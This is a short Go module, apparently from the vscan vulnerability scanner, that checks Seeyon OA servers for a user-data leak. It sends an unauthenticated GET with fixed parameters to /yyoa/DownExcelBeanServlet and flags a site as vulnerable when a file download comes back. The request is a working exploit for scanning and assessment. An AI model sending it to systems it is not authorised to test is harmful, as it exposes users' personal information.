package seeyon

import (
	"fmt"
	"github.com/veo/vscan/pkg"
)

//DownExcelBeanServlet 用户敏感信息泄露

func DownExcelBeanServlet(u string) bool {
	var vuln = false
	if req, err := pkg.HttpRequset(u+"/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && req.Header.Get("Content-disposition") != "" {
			pkg.GoPocLog(fmt.Sprintf("Found vuln seeyon DownExcelBeanServlet|%s\n", u+"/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0"))
			vuln = true
		}
	}
	return vuln
}
